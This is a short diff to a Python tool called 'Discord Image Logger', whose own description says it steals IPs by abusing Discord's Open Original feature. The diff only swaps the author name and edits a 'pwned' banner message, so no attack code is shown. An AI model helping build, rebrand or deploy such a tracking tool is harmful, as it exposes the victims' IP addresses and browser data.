@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "timzz71"
 
 config = {
     # BASE CONFIG #
@@ -26,7 +26,7 @@ config = {
 
     "message": {
         "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger.",
+        "message": "This browser has been pwned by Timz Image Logger.",
         "richMessage": True,
     },
 
